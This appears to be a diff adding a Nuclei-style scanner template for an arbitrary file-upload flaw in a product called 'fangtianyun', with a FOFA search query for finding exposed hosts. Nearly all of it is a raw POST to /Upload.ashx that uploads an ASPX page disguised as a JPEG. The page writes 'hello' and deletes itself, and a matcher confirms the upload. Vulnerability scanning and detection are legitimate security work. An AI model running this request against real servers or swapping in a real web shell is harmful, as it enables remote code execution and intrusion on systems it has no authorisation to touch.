@@ -1,0 +1,36 @@
+id: fangtianyun_upload
+
+
+info:
+  tags: fangtianyun_upload
+  name: fangtianyun_upload
+  author: xc
+  severity: high
+  description: fangtianyun_upload
+  metadata:
+    fofa-qeury: body="AjaxMethods.asmx/GetCompanyItem"
+    veified: true
+    max-request: 1
+
+requests:
+- raw:
+  - |
+    POST /Upload.ashx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+    Connection: close
+    
+    ------WebKitFormBoundarySl8siBbmVicABvTX
+    Content-Disposition: form-data; name="file"; filename="qwe.aspx"
+    Content-Type: image/jpeg
+    
+    <%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
+    ------WebKitFormBoundarySl8siBbmVicABvTX--
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - ".aspx"
